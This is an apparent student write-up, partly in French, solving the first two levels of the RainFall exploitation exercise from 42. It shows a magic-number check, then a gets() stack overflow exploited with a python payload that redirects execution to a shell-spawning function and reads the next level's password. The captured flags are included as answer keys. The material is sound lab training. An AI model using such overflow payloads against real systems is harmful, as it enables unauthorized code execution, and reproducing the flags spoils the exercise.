# RainFall
RainFall project from 42

# Flag 0

if (iVar1 == 0x1a7)

0x1a7 = 423

./level0 423

## flag : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

# Flag 1

void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}

76 * "A" puis chunk de 4 lettres pour reperer ou est le degfault

./level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault (core dumped)

dmesg | grep segfault
[ 2079.333489] level1[6202]: segfault at 42424242 ip 42424242 sp bffffc90 error 4

42 = B

gdb ./level1
(gdb) info functions
(gdb) p run

$1 = {<text variable, no debug info>} 0x8048444 <run>

(python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


## flag : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

